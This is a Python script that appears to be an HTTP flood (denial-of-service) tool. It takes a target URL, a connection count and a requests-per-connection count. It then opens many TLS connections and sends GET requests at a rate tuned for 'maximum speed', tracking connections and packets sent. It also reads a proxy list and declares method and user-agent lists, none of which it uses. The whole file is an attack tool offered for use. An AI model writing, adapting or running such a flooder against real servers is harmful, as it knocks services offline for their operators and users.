import asyncio
import sys
import urllib.parse
import ssl
import random
import socket
import socks
import time
import ipaddress

import aiohttp

method = ["POST ", "GET ", "PUT ", "DELETE ", "PATCH ", "OPTIONS "]
useragents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"]

pps, cps = 0, 0

def generate_request(url):
    return (
        f"GET {url.path or '/'} HTTP/1.1\r\n"
        f"Host: {url.hostname}\r\n"
        f"\r\n"
    ).encode('latin-1')

async def connect(url, rpc, request_interval):
    global cps, pps
    context = ssl.SSLContext(ssl.PROTOCOL_TLS)  # Use TLS 1.3
    context.options |= ssl.OP_NO_SSLv2
    context.options |= ssl.OP_NO_SSLv3
    reader, writer = await asyncio.open_connection(url.hostname, url.port or 443, ssl=context)
    cps += 1

    prox = open("./http.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    
    for _ in range(rpc):
        request_payload = generate_request(url)
        writer.write(request_payload)
        await writer.drain()
        pps += 1
        await asyncio.sleep(request_interval)

async def main():
    url = urllib.parse.urlsplit(sys.argv[1])
    rpc = int(sys.argv[3])
    min_desired_bandwidth_mbps = 10000  # Set to a higher value to utilize maximum speed
    max_desired_bandwidth_mbps = 10000
    request_size_bytes = len(generate_request(url))
    
    # Calculate interval based on desired bandwidth within the range
    min_request_interval = request_size_bytes * 3002 / (max_desired_bandwidth_mbps * 100000)
    max_request_interval = request_size_bytes * 3002 / (min_desired_bandwidth_mbps * 100000)
    random.seed()  # Seed random number generator
    request_interval = random.uniform(min_request_interval, max_request_interval)
    
    tasks = [connect(url, rpc, request_interval) for _ in range(int(sys.argv[2]))]
    await asyncio.gather(*tasks)

if len(sys.argv) != 4:
    exit("python3 %s <target> <connections> <rpc>" % sys.argv[0])

loop = asyncio.get_event_loop()
loop.run_until_complete(main())